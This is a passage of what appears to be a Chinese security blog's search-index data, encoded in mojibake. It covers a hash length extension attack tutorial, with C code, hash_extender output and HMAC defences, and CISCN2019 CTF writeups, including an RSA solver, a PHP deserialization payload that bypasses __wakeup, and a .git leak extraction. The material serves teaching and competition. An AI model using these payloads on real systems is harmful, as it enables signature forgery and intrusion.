i++) { printf(\"%02x\", buffer[i]); } printf(\"\\n\"); return 0; } è¿è¡Œï¼š $ gcc -o hash_extension_1 hash_extension_1.c -lssl -lcrypto $ ./hash_extension_1 æ‰€ä»¥ï¼ŒæœåŠ¡å™¨ä¼šæ£€æŸ¥æˆ‘ä»¬å‘é€çš„æ–°æ•°æ®ï¼Œå°†å®ƒä¸ä¸Šé¢çš„å“ˆå¸Œå€¼æ¯”å¯¹ã€‚ç°åœ¨ï¼Œä½œä¸ºæ”»å‡»è€…ï¼Œæˆ‘ä»¬è¦è€ƒè™‘çš„æ˜¯å¦‚ä½•ç”Ÿæˆè¿™ä¸ªå€¼ã€‚ ","date":"2019-06-29","objectID":"/hash-len-ext-atk/:5:0","tags":["Hash"],"title":"ç”»è›‡æ·»è¶³ï¼šå“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»","uri":"/hash-len-ext-atk/"},{"categories":["Web å®‰å…¨"],"content":"å®¢æˆ·ç«¯è®¡ç®— æ€ä¹ˆåœ¨ä¸çŸ¥é“ secret çš„æƒ…å†µä¸‹è®¡ç®—å‡ºé‚£ä¸ªå€¼å‘¢ï¼Ÿ é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦çœ‹ä¸€ä¸‹æˆ‘ä»¬è¦å¤„ç†å“ªäº›æ•°æ®ï¼šdata, append, H, H(secret || data). æˆ‘ä»¬éœ€è¦å®šä¹‰æ–°å‡½æ•° Hâ€™ï¼Œå®ƒä¸ H ä½¿ç”¨åŒæ ·çš„å“ˆå¸Œå‡½æ•°ï¼Œä½†å¼€å§‹çŠ¶æ€æ˜¯ H(secret || data) çš„ç»“æŸçŠ¶æ€ï¼Œå³ signatureã€‚ç„¶åæˆ‘ä»¬å°±åªè¦è®¡ç®— H'(append)ï¼Œè¾“å‡ºçš„å°±æ˜¯æˆ‘ä»¬è¦çš„å“ˆå¸Œå€¼ã€‚ #include \u003cstdio.h\u003e#include \u003copenssl/md5.h\u003e int main(int argc, const char *argv[]) { int i; unsigned char buffer[MD5_DIGEST_LENGTH]; MD5_CTX c; MD5_Init(\u0026c); MD5_Update(\u0026c,\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\", 64); c.A = htonl(0x6036708e); /* \u003c-- This is the hash we already had */ c.B = htonl(0xba0d11f6); c.C = htonl(0xef52ad44); c.D = htonl(0xe8b74d5b); MD5_Update(\u0026c,\"append\", 6); /* This is the appended data. */ MD5_Final(buffer, \u0026c); for (i = 0; i \u003c 16; i++) { printf(\"%02x\", buffer[i]); } printf(\"\\n\"); return 0; } è¿è¡Œï¼š $ gcc -o hash_extension_2 hash_extension_2.c -lssl -lcrypto $ ./hash_extension_2 ç»“æœä¸åˆšæ‰çš„å“ˆå¸Œå€¼ä¸€è‡´ï¼Œä½†æ˜¯åŒºåˆ«åœ¨äºï¼Œæˆ‘ä»¬æ ¹æœ¬æ²¡æœ‰ç”¨åˆ° secretã€‚ç®€å•åœ°è¯´ï¼šè¿™æ®µä»£ç æœ¬è´¨ä¸Šå°±æ˜¯ç”¨ä»æ–°å“ˆå¸Œå€¼ä¸­å¾—åˆ°çš„çŠ¶æ€ï¼ˆå››ä¸ªé“¾å˜é‡çš„å€¼ï¼‰å»è¦†ç›–äº†å››ä¸ªåˆå§‹é“¾å˜é‡ï¼Œéšåå†ç»§ç»­è¿›è¡Œæ­£å¸¸çš„å“ˆå¸Œå‡½æ•°è®¡ç®—ã€‚ ","date":"2019-06-29","objectID":"/hash-len-ext-atk/:6:0","tags":["Hash"],"title":"ç”»è›‡æ·»è¶³ï¼šå“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»","uri":"/hash-len-ext-atk/"},{"categories":["Web å®‰å…¨"],"content":"ç»“æœ ç°åœ¨æˆ‘ä»¬æœ‰å­—ç¬¦ä¸²æ•°æ®ï¼š 0000 64 61 74 61 80 00 00 00 00 00 00 00 00 00 00 00 data............ 0010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0030 00 00 50 00 00 00 00 00 00 00 61 70 70 65 6e 64 ..P.......append ä»¥åŠ H(secret || data || append) çš„å“ˆå¸Œå€¼ï¼š 6ee582a1669ce442f3719c47430dadee å¹¶ä¸”ï¼Œäº§ç”Ÿè¿™ä¸€å“ˆå¸Œå€¼å¹¶ä¸éœ€è¦çŸ¥é“ secret çš„å€¼ï¼æˆ‘ä»¬å‘é€è¿™ä¸€æ•°æ®ï¼Œä»¥åŠæˆ‘ä»¬ç®—å‡ºçš„æ–°å“ˆå¸Œå€¼ã€‚æœåŠ¡å™¨å°±ä¼šæŠŠ secret æ”¾åˆ°å‰é¢ï¼Œè®¡ç®—å“ˆå¸Œï¼Œç„¶åå¾—åˆ°ä¸€ä¸ªå®Œå…¨ä¸€è‡´çš„å“ˆå¸Œå€¼ï¼Œæ”»å‡»å®Œæˆã€‚ ","date":"2019-06-29","objectID":"/hash-len-ext-atk/:7:0","tags":["Hash"],"title":"ç”»è›‡æ·»è¶³ï¼šå“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»","uri":"/hash-len-ext-atk/"},{"categories":["Web å®‰å…¨"],"content":"å·¥å…· ä½¿ç”¨æ–¹æ³•ï¼š $ ./hash_extender --data data --secret 6 --append append --signature 6036708eba0d11f6ef52ad44e8b74d5b --format md5 Type: md5 Secret length: 6 New signature: 6ee582a1669ce442f3719c47430dadee New string: 64617461800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005000000000000000617070656e64 å¦‚æœä¸æ¸…æ¥šå“ˆå¸Œå‡½æ•°çš„ç±»å‹ï¼Œå¯ä»¥å°è¯•ä¸åŒç±»å‹çš„å‡½æ•°ï¼Œåªè¦ä¸è®¾ç½® --format å‚æ•°å³å¯ã€‚æ­¤æ—¶å»ºè®®ä½¿ç”¨ --table å‚æ•°ã€‚ $ ./hash_extender --data data --secret 6 --append append --signature 6036708eba0d11f6ef52ad44e8b74d5b --out-data-format html --table md4 89df68618821cd4c50dfccd57c79815b data80000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000P00000000000000append md5 6ee582a1669ce442f3719c47430dadee data80000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000P00000000000000append å…³äºè¾“å…¥è¾“å‡ºçš„æ ¼å¼æœ‰å¾ˆå¤šé€‰é¡¹ï¼ŒåŒ…æ‹¬ HTMLï¼ˆä½¿ç”¨ %NN è¡¨ç¤ºæ³•ï¼‰ï¼ŒC å­—ç¬¦ä¸²ï¼ˆä½¿ç”¨ \\xNN è¡¨ç¤ºæ³•ï¼‰ï¼Œåå…­è¿›åˆ¶è¡¨ç¤ºç­‰ç­‰ã€‚é»˜è®¤é€‰é¡¹ï¼š è¾“å…¥æ•°æ®ï¼šraw è¾“å…¥å“ˆå¸Œå€¼ï¼šhex è¾“å‡ºæ•°æ®ï¼šhex è¾“å‡ºå“ˆå¸Œå€¼ï¼šhex å¸®åŠ©é¡µé¢ä¾›å‚è€ƒï¼š -------------------------------------------------------------------------------- HASH EXTENDER -------------------------------------------------------------------------------- By Ron Bowes See LICENSE.txt for license information. Usage: ./hash_extender \u003c--data=|--file=\u003e --signature= --format= [options] INPUT OPTIONS -d --data= The original string that we're going to extend. --data-format= The format the string is being passed in as. Default: raw. Valid formats: raw, hex, html, cstr --file= As an alternative to specifying a string, this reads the original string as a file. -s --signature= The original signature. --signature-format= The format the signature is being passed in as. Default: hex. Valid formats: raw, hex, html, cstr -a --append= The data to append to the string. Default: raw. --append-format= Valid formats: raw, hex, html, cstr -f --format= [REQUIRED] The hash_type of the signature. This can be given multiple times if you want to try multiple signatures. 'all' will base the chosen types off the size of the signature and use the hash(es) that make sense. Valid types: md4, md5, ripemd160, sha, sha1, sha256, sha512, whirlpool -l --secret= The length of the secret, if known. Default: 8. --secret-min= --secret-max= Try different secret lengths (both options are required) OUTPUT OPTIONS --table Output the string in a table format. --out-data-format= Output data format. Valid formats: none, raw, hex, html, html-pure, cstr, cstr-pure, fancy --out-signature-format= Output signature format. Valid formats: none, raw, hex, html, html-pure, cstr, cstr-pure, fancy OTHER OPTIONS -h --help Display the usage (this). --test Run the test suite. -q --quiet Only output what's absolutely necessary (the output string and the signature) å…¶ä»–å·¥å…·æœ‰ HashPump å’ŒHexpandç­‰ï¼Œä¸è¿‡ä¸ªäººè§‰å¾—ä¸å¦‚ hash_extender ä½¿ç”¨æ–¹ä¾¿ã€‚ ","date":"2019-06-29","objectID":"/hash-len-ext-atk/:8:0","tags":["Hash"],"title":"ç”»è›‡æ·»è¶³ï¼šå“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»","uri":"/hash-len-ext-atk/"},{"categories":["Web å®‰å…¨"],"content":"é˜²å¾¡ æ‰€ä»¥æˆ‘ä»¬è¦å¦‚ä½•é˜²å¾¡è¿™ç§æ”»å‡»ï¼Ÿå®é™…ä¸Šå¾ˆç®€å•ï¼Œæœ‰ä¸¤ç§æ–¹æ³•ï¼š å¯ä»¥çš„è¯ï¼Œå°½å¯èƒ½ä¸è¦ä½¿ç”¨åŠ å¯†çš„æ•°æ®æˆ–ç­¾åæ¥è®¤è¯ç”¨æˆ· å¦‚æœå¿…é¡»ä½¿ç”¨ï¼Œå¯ä»¥ä½¿ç”¨ HMAC ç®—æ³•è€Œä¸æ˜¯è‡ªå·±å†™è¿™ç§ç®—æ³• HMAC ç®—æ³•æ‰æ˜¯çœŸæ­£çš„è§£å†³ä¹‹é“ï¼Œä¹Ÿå°±æ˜¯å°†å“ˆå¸Œå€¼å†å“ˆå¸Œä¸€æ¬¡ï¼Œå¦‚ï¼šH(secret || H(secret || data))ã€‚ æ­¤å¤–ï¼Œè¿˜å¯ä»¥å°† secret æ”¾åœ¨æ•°æ®æœ«å°¾ï¼Œä¹Ÿå°±æ˜¯ H(data || secret)ã€‚ç”±äºæœåŠ¡å™¨ç«¯ä¼šåœ¨æœ«å°¾åŠ  secretï¼ŒåŸæ¥çš„ attacker_controlled_data å°±å˜æˆäº† attacker_controlled_data || secretï¼Œç”±äºä¸çŸ¥é“ secretï¼Œæ”»å‡»è€…ä¹Ÿä¸èƒ½å†æ§åˆ¶å“ˆå¸Œå€¼ã€‚ ","date":"2019-06-29","objectID":"/hash-len-ext-atk/:9:0","tags":["Hash"],"title":"ç”»è›‡æ·»è¶³ï¼šå“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»","uri":"/hash-len-ext-atk/"},{"categories":["Web å®‰å…¨"],"content":"å‚è€ƒèµ„æ–™ å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡» (Hash Length Extension Attacks) Everything you need to know about hash length extension attacks ","date":"2019-06-29","objectID":"/hash-len-ext-atk/:10:0","tags":["Hash"],"title":"ç”»è›‡æ·»è¶³ï¼šå“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»","uri":"/hash-len-ext-atk/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"æ‰“å®Œæ¯”èµ›å°±å›å»å¿…ä¿®è¯¾æœŸæœ«è€ƒï¼Œäºæ˜¯ç°åœ¨æ‰æ•´ç†ã€‚è¿™é‡Œåªè®°å½•äº†å°‘æ•°å‡ é¢˜çš„ writeupã€‚ ","date":"2019-06-28","objectID":"/ciscn2019/:0:0","tags":["RSA","ååºåˆ—åŒ–","Hash"],"title":"CISCN2019 åˆèµ›+åŠå†³èµ›éƒ¨åˆ†é¢˜è§£","uri":"/ciscn2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"åˆèµ› ","date":"2019-06-28","objectID":"/ciscn2019/:1:0","tags":["RSA","ååºåˆ—åŒ–","Hash"],"title":"CISCN2019 åˆèµ›+åŠå†³èµ›éƒ¨åˆ†é¢˜è§£","uri":"/ciscn2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"ç­¾åˆ° ä¸‹è½½å‹ç¼©åŒ…åè§£å‹å¾—åˆ° exeï¼Œè¿è¡Œåå‘ç°éœ€è¦é€šè¿‡æ‘„åƒå¤´è¯†åˆ« 3 ä¸ªé˜Ÿå‘˜çš„äººè„¸ã€‚è¯†åˆ«æˆåŠŸåå³å¾—åˆ° flagã€‚ ","date":"2019-06-28","objectID":"/ciscn2019/:1:1","tags":["RSA","ååºåˆ—åŒ–","Hash"],"title":"CISCN2019 åˆèµ›+åŠå†³èµ›éƒ¨åˆ†é¢˜è§£","uri":"/ciscn2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"Saleae ä¸‹è½½æ–‡ä»¶åè§£å‹å¾—åˆ° saleae.logicdataï¼Œå› æ­¤æˆ‘ä»¬ç”¨ Logic æ‰“å¼€è¯¥æ–‡ä»¶ï¼Œå¾—åˆ°å››ä¿¡é“çš„æ³¢å½¢å›¾ï¼š å›¾ 1 \" å›¾ 1 ç”±äºé¢˜ç›®æç¤ºè¯¥æ³¢å½¢å›¾æ¥è‡ª U ç›˜ï¼Œè€Œä¸”å…±æœ‰å››ä¸ªä¿¡é“ï¼Œå› æ­¤çŒœæƒ³å¯èƒ½é‡‡ç”¨äº† SPI åè®®ã€‚åœ¨å³ä¾§ Analyzer é‡Œæ–°å»ºåˆ†æå™¨ï¼š å›¾ 2 \" å›¾ 2 è¿™é‡Œä¸»è¦éœ€è¦ç¡®å®šçš„æ˜¯å››ä¸ªä¿¡é“æ˜¯å¦‚ä½•å¯¹åº” SPI åè®®çš„å››ä¿¡é“çš„ã€‚è§‚å¯Ÿæ³¢å½¢ï¼š å›¾ 3 \" å›¾ 3 å¯ä»¥çœ‹åˆ° Channel0 æ³¢å½¢å‘¨æœŸååˆ†ç¨³å®šï¼Œæ¯”è¾ƒå¯èƒ½æ˜¯ Clockï¼›Channel1 æŒç»­ä½ç”µå¹³ï¼Œå¯èƒ½æ˜¯ Enableï¼Œæˆ–è€… MOSI/MISO äºŒè€…ä¹‹ä¸€ã€‚ å›¾ 4 \" å›¾ 4 Channel2 æ³¢å½¢è¾ƒä¸è§„å¾‹ï¼Œåˆ™å¿…å®šæ˜¯ MOSI/MISO äºŒè€…ä¹‹ä¸€ï¼›Channel3 å¯¹åº” Channel2 çš„é‚£ä¸€æ®µï¼Œä¸¤ç«¯æ°å¥½å‘ç”Ÿè·³å˜ï¼Œå› æ­¤å¾ˆæœ‰å¯èƒ½æ˜¯ Enableã€‚äºæ˜¯æˆ‘ä»¬æ¨å‡º Channel1 åªèƒ½æ˜¯ MOSI/MISO äºŒè€…ä¹‹ä¸€ã€‚ æœ€ç»ˆï¼Œæˆ‘ä»¬å‘ç°è¿™æ ·çš„ä¿¡é“åˆ†é…å¯ä»¥ç»™å‡ºæœ‰ç”¨çš„ä¿¡æ¯ï¼š å›¾ 5 \" å›¾ 5 å›¾ 6 \" å›¾ 6 æ‹¼æ¥æˆå­—ç¬¦ä¸²å³å¯å¾—åˆ° flagã€‚ ","date":"2019-06-28","objectID":"/ciscn2019/:1:2","tags":["RSA","ååºåˆ—åŒ–","Hash"],"title":"CISCN2019 åˆèµ›+åŠå†³èµ›éƒ¨åˆ†é¢˜è§£","uri":"/ciscn2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"24c åŒä¸Šé¢˜åšæ³•ï¼Œæ ¹æ®æ³¢å½¢çŒœæµ‹ä¸º I2C åè®®ï¼Œè½½å…¥æ¨¡æ¿å¯å¾—ï¼š Time[s],AnalyzerName,DecodedProtocolResult 0.843705500000000,I2C,SetupWriteto['160']+ACK 0.843872000000000,I2C,''+ACK 0.844038500000000,I2C,f+ACK 0.844205000000000,I2C,1+ACK 0.844371000000000,I2C,6+ACK 0.844537500000000,I2C,3+ACK 0.844704000000000,I2C,b+ACK 0.844870500000000,I2C,d+ACK 0.845036500000000,I2C,f+ACK 0.845203000000000,I2C,4+ACK 0.845369500000000,I2C,e+ACK 0.845536000000000,I2C,}+ACK 0.845702500000000,I2C,'0'+ACK 0.945796000000000,I2C,SetupWriteto['160']+ACK 0.945962500000000,I2C,'0'+ACK 0.946154000000000,I2C,SetupReadto['161']+ACK 0.946318000000000,I2C,f+ACK 0.946481500000000,I2C,l+ACK 0.946645000000000,I2C,a+ACK 0.946808500000000,I2C,g+ACK 0.946972000000000,I2C,{+ACK 0.947135500000000,I2C,c+ACK 0.947299500000000,I2C,4+ACK 0.947463000000000,I2C,6+ACK 0.947626500000000,I2C,d+ACK 0.947790000000000,I2C,9+ACK 0.947953500000000,I2C,e+ACK 0.948117500000000,I2C,1+ACK 0.948281000000000,I2C,0+ACK 0.948444500000000,I2C,-+ACK 0.948608000000000,I2C,e+ACK 0.948771500000000,I2C,9+ACK 0.948935500000000,I2C,b+ACK 0.949099000000000,I2C,5+ACK 0.949262500000000,I2C,-+ACK 0.949426000000000,I2C,4+ACK 0.949589500000000,I2C,d+ACK 0.949753000000000,I2C,9+ACK 0.949917000000000,I2C,0+ACK 0.950080500000000,I2C,-+ACK 0.950244000000000,I2C,a+ACK 0.950407500000000,I2C,8+ACK 0.950571000000000,I2C,8+ACK 0.950734500000000,I2C,3+ACK 0.950898000000000,I2C,-+ACK 0.951061500000000,I2C,4+ACK 0.951225000000000,I2C,1+ACK 0.951388500000000,I2C,c+NAK 5.946480500000000,I2C,SetupWriteto['160']+ACK 5.946647000000000,I2C,\\t+ACK 5.946813500000000,I2C,a+ACK 5.946980000000000,I2C,c+ACK çŒœæµ‹ flag ä¸º flag{c46d9e10-e9b5-4d90-a883-41cf163bdf4e}ï¼Œä½†æäº¤æç¤ºé”™è¯¯ã€‚ æ³¨æ„åˆ°æœ€åä¸‰ä¸ªå­—ç¬¦ \\t a cï¼Œç”±äº \\t å‡ºç°åœ¨è¿™é‡Œå¾ˆè¿å’Œï¼ŒçŒœæƒ³è¿™ä¸ªå­—ç¬¦å¹¶ä¸ä»£è¡¨å­—ç¬¦æœ¬èº«ï¼Œè€Œæ˜¯ ASCII ç å¯¹åº”çš„åå…­è¿›åˆ¶æ•°ï¼ˆä¹Ÿå°±æ˜¯ 09ï¼‰ã€‚ç»“åˆ I2C åè®®çº¦å®šï¼ŒçŒœæµ‹æ˜¯å°† flag ä»ç¬¬ 9 ä½å¼€å§‹ï¼Œç”¨ ac ä¸¤ä¸ªå­—ç¬¦å»è¦†ç›–æ‰åŸå†…å®¹ï¼Œäºæ˜¯å¾—åˆ°ï¼šflag{c46dac10-e9b5-4d90-a883-41cf163bdf4e}ï¼Œå³æœ€ç»ˆ flagã€‚ ","date":"2019-06-28","objectID":"/ciscn2019/:1:3","tags":["RSA","ååºåˆ—åŒ–","Hash"],"title":"CISCN2019 åˆèµ›+åŠå†³èµ›éƒ¨åˆ†é¢˜è§£","uri":"/ciscn2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"usbasp ä¸‹è½½æ–‡ä»¶åè§£å‹å¾—åˆ° usbasp.logicdataï¼Œå› æ­¤æˆ‘ä»¬ç”¨ Logic æ‰“å¼€è¯¥æ–‡ä»¶ï¼Œå¾—åˆ°å››ä¿¡é“çš„æ³¢å½¢å›¾ã€‚ç”±äºå…±æœ‰å››ä¸ªä¿¡é“ï¼Œå› æ­¤çŒœæƒ³å¯èƒ½é‡‡ç”¨äº† SPI åè®®ã€‚åœ¨å³ä¾§ Analyzer é‡Œæ–°å»ºåˆ†æå™¨ï¼š å›¾ 7 \" å›¾ 7 è¿™é‡Œä¸»è¦éœ€è¦ç¡®å®šçš„æ˜¯å››ä¸ªä¿¡é“æ˜¯å¦‚ä½•å¯¹åº” SPI åè®®çš„å››ä¿¡é“çš„ã€‚è§‚å¯Ÿæ³¢å½¢ï¼š å›¾ 8 \" å›¾ 8 å¯ä»¥çœ‹åˆ° Channel2 æ³¢å½¢å‘¨æœŸååˆ†ç¨³å®šï¼Œæ¯”è¾ƒå¯èƒ½æ˜¯ Clockï¼›Channel0 å’Œ Channel1 æ²¡æœ‰ç‰¹å®šçš„è§„å¾‹ï¼Œå› æ­¤åº”è¯¥åˆ†åˆ«æ˜¯ MISO/MOSI ä¹‹ä¸€ã€‚äºæ˜¯ Channel3 åº”è¯¥æ˜¯ Enableã€‚ æ­¤å¤–ï¼Œè§‚å¯Ÿ Channel3ï¼Œå¯ä»¥å‘ç°åº”è¯¥æ˜¯é«˜ç”µå¹³è§¦å‘ã€‚æœ€ç»ˆï¼Œæˆ‘ä»¬å‘ç°è¿™æ ·çš„ä¿¡é“åˆ†é…å’Œè®¾ç½®å¯ä»¥ç»™å‡ºæœ‰ç”¨çš„ä¿¡æ¯ï¼š å›¾ 9 \" å›¾ 9 å›¾ 10 \" å›¾ 10 æ‹¼æ¥æˆå­—ç¬¦ä¸²å³å¯å¾—åˆ° flagã€‚ å±…ç„¶èƒ½å‡ºä¸‰é“å·®ä¸å¤šçš„é¢˜ï¼Œè€Œä¸”å·ç§°æ˜¯ IoT é¢˜ï¼Ÿï¼Ÿ ","date":"2019-06-28","objectID":"/ciscn2019/:1:4","tags":["RSA","ååºåˆ—åŒ–","Hash"],"title":"CISCN2019 åˆèµ›+åŠå†³èµ›éƒ¨åˆ†é¢˜è§£","uri":"/ciscn2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"Asymmetric ï¼ˆå›¾ç‰‡æ¥è‡ªé˜Ÿå‹ï¼‰ å›¾ 11 \" å›¾ 11 å…¶å®å°±æ˜¯å˜ç§ RSAï¼Œæ˜ç™½äº†è¿™ä¸€ç‚¹å°±å®¹æ˜“äº†ï¼Œä½†æ˜¯å‘ç‚¹åœ¨äº python ä¸­ long å’Œ bytes äº’è½¬çš„é—®é¢˜ï¼Œæ¨è python2 å†™ï¼š import gmpy2 import random from Crypto.Util.number import * p=165740755190793304655854506052794072378181046252118367693457385632818329041540419488625472007710062128632942664366383551452498541560538744582922713808611320176770401587674618121885719953831122487280978418110380597358747915420928053860076414097300832349400288770613227105348835005596365488460445438176193451867 p3 = p**3 p4 = p**4 def gcd(a,b): while a != 0: a,b = b%a, a return b def generate_key(nbit): e=58134567416061346246424950552806959952164141873988197038339318172373514096258823300468791726051378264715940131129676561677588167620420173326653609778206847514019727947838555201787320799426605222230914672691109516799571428125187628867529996213312357571123877040878478311539048041218856094075106182505973331343540958942283689866478426396304208219428741602335233702611371265705949787097256178588070830596507292566654989658768800621743910199053418976671932555647943277486556407963532026611905155927444039372549162858720397597240249353233285982136361681173207583516599418613398071006829129512801831381836656333723750840780538831405624097443916290334296178873601780814920445215584052641885068719189673672829046322594471259980936592601952663772403134088200800288081609498310963150240614179242069838645027877593821748402909503021034768609296854733774416318828225610461884703369969948788082261611019699410587591866516317251057371710851269512597271573573054094547368524415495010346641070440768673619729280827372954003276250541274122907588219152496998450489865181536173702554116251973661212376735405818115479880334020160352217975358655472929210184877839964775337545502851880977049299029101466287659419446724781305689536816523774995178046989696610897508786776845460908137698543091418571263630383061605011820139755322231913029643701770497299157169690586232187419462594477116374977216427311975598620616618808494138669546120288334682865354702356192972496556372279363023366842805886601834278434406709218165445335977049796015123909789363819484954615665668979L pubkey = (long(e), long(p4)) return pubkey def findModReverse(a,m): if gcd(a,m) != 1: return None u1, u2, u3 = 1L, 0L, a v1, v2, v3 = 0L, 1L, m while v3 != 0: q = u3//v3 v1, v2, v3, u1, u2, u3 = (u1-q*v1), (u2-q*v2), (u3-q*v3), v1, v2, v3 return u1%m def crypt(msg, pkey): e, n = pkey m = bytes_to_long(msg) assert m \u003c n -1 enc = pow(m, e, n) return long_to_bytes(enc) def decrypt(msg, pkey): e, n = pkey c = bytes_to_long(msg) d = findModReverse(e, p3*(p-1)) dec = pow(c, d, n) return long_to_bytes(dec) nbit = 1024 pubkey = generate_key(nbit) print 'pubkey =', pubkey cipher=\"YXmuOsaD1W4poLAG2wPrJ/nYZCkeOh2igCYKnZA6ecCeJadT6B3ZVTciPN6LJ8AcAsRXNnkC6+9PNJPhmosSG5UGGbpIcg2JaZ1iA8Sm3fGiFacGvQsJOqqIWb01rjaQ3rDBKB331rrNo9QNOfMnjKr0ejGG+dNObTtvnskICbYbNnSxMxLQF57H5JnWZ3LbbKQ493vmZzwvC6iH8blNPAp3dBlVzDqIAmxmUbk0OzFjPoHphD1oxHdzXyQNW+sLxVldrf9xcItq92jN5sqBYrG8wADIqY1/sqhTMZvkIYFMHqoMQuiRSnVrCF2h2RtGDEayLo0evgXI/0W3YveyKCHViOnG6wypcBFm91ZWdjp3fVW/4DyxW6xu9hg/NlXyRP6pT/OyQpcyTqKRuiXJLWgFUJI/8TRgyAjBLLgSd3U0N3VM8kewXw5j+fMUTCW9/Gy4iP8m52Zabx/vEKdwdGZ0QyvgvAWGUFZ96EK0g1BM/LU9Tuu2R+VKcCSCprg283x6NfYxmU26KlQE6ZrrjLmbCOe0327uaW9aDbLxZytPYIE5ZkzhSsD9JpQBKL30dCy3UKDbcuNgB6SrDddrbIuUd0/kLxuwh6kTqNbC4NDrOT4WAuP4se8GGOK8Wz0dL6rE6FkzMnI4Qg501MTSNQZ4Bp7cNf6H9lTa/4DNOl0==\" flag = decrypt(cipher.decode('base64'),pubkey) print flag ","date":"2019-06-28","objectID":"/ciscn2019/:1:5","tags":["RSA","ååºåˆ—åŒ–","Hash"],"title":"CISCN2019 åˆèµ›+åŠå†³èµ›éƒ¨åˆ†é¢˜è§£","uri":"/ciscn2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"JustSoso æŸ¥çœ‹æºä»£ç å‘ç°éœ€è¦ hint.phpï¼Œé€šè¿‡ php ä¼ªåè®®è½¬æ¢ä¸º Base64 ç¼–ç è·å–ï¼š?file=php://filter/convert.base64-encode/resource=hint.phpã€‚ å¯¹äº index.php ä¹ŸåŒç†ï¼š?file=php://filter/convert.base64-encode/resource=index.phpã€‚ å›¾ 12 \" å›¾ 12 å¾—åˆ° index.phpï¼š å›¾ 13 \" å›¾ 13 ä»¥åŠ hint.phpï¼š å›¾ 14 \" å›¾ 14 ä» hint.php å¯ä»¥çœ‹å‡ºï¼ŒFlag ç±»çš„ getFlag å‡½æ•°æœ€ç»ˆä¼šæ‰“å° flagï¼Œè€Œè¯¥å‡½æ•°ç”± Handle ç±»è°ƒç”¨ã€‚å†å®¡æŸ¥ index.phpï¼Œå‘ç°éœ€è¦å…ˆ include ä¸€ä¸‹ hint.phpï¼Œè¿‡æ»¤åååºåˆ—åŒ– payloadã€‚ å› æ­¤æˆ‘ä»¬éœ€è¦åˆ©ç”¨ php ååºåˆ—åŒ–æ¼æ´ï¼Œå…ˆæ„é€  flag.phpï¼Œå³ï¼šnewHandle(newFlag(â€œflag.phpâ€))ã€‚ ç„¶åæˆ‘ä»¬éœ€è¦ç»•è¿‡çš„è¿‡æ»¤æœ‰ï¼š payload ä¸­å¯¹ flag çš„æ­£åˆ™è¿‡æ»¤ï¼› ç»•è¿‡ __wakeup å‡½æ•°ä¸­å¯¹ handle ç½® null çš„æ“ä½œï¼› ç»•è¿‡ä»£ç ä¸­è¦æ±‚ md5 å€¼ç›¸ç­‰çš„åˆ¤æ–­ã€‚ ç”± cve-2016-7124ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œå½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡ __wakeup() çš„æ‰§è¡Œã€‚ å› æ­¤æˆ‘ä»¬åœ¨ payload ä¸­éœ€è¦æ³¨æ„ï¼šå°† payload ä¸­çš„ 1 æ”¹ä¸ºå¤§äº 1 çš„ä»»æ„æ•´æ•°æ¥è·³è¿‡ __wakeup å‡½æ•°ï¼Œç”¨ %00 å¡«å…… Handleï¼Œå¹¶ä»¤ token ç­‰äº token_flag çš„å¼•ç”¨ã€‚æœ€ç»ˆ payload: ///index.php?file=hint.php\u0026payload=O:6:\"Handle\":2:{s:14:\"%00Handle%00handle\";O:4:\"Flag\":3:{s:4:\"file\";s:8:\"flag.php\";s:5:\"token\";N;s:10:\"token_flag\";R:4;}} æµè§ˆå™¨ä¸­è®¿é—®å³å¯å¾—åˆ° flagã€‚ ","date":"2019-06-28","objectID":"/ciscn2019/:1:6","tags":["RSA","ååºåˆ—åŒ–","Hash"],"title":"CISCN2019 åˆèµ›+åŠå†³èµ›éƒ¨åˆ†é¢˜è§£","uri":"/ciscn2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"åŠå†³èµ› ","date":"2019-06-28","objectID":"/ciscn2019/:2:0","tags":["RSA","ååºåˆ—åŒ–","Hash"],"title":"CISCN2019 åˆèµ›+åŠå†³èµ›éƒ¨åˆ†é¢˜è§£","uri":"/ciscn2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"web6 æœ¬é¢˜å­˜åœ¨ .git ä»“åº“æ³„éœ²ï¼Œæˆ‘ä»¬ç”¨ GitHack æå–æ–‡ä»¶ï¼š $ python GitHack.py http://172.29.12.114/.git/ å¾—åˆ° getflag.php å’Œ index.htmlï¼Œæ˜¾ç„¶åªæœ‰å‰è€…æœ‰ç”¨ã€‚æŸ¥çœ‹ getflag.php æºç ï¼š \u003c?php error_reporting(0); include \"flag.php\"; $user=$_POST['user']; function encrypt($text){ global $key; return md5($key.$text); } if (encrypt($user)===$_COOKIE['verify']) { if(is_numeric(strpos($user,'root'))){ die($flag); } else{ die('not rootï¼ï¼ï¼'); } } else{ setcookie(\"verify\",encrypt(\"guest\"),time()+60*60*24); setcookie(\"len\",strlen($key),time()+60*60*24); } //show_source(__FILE__); æˆ‘ä»¬æƒ³è¦è¿›å…¥ die($flag) è¿™ä¸€è¡Œï¼Œéœ€è¦é€šè¿‡ä¸¤ä¸ª if 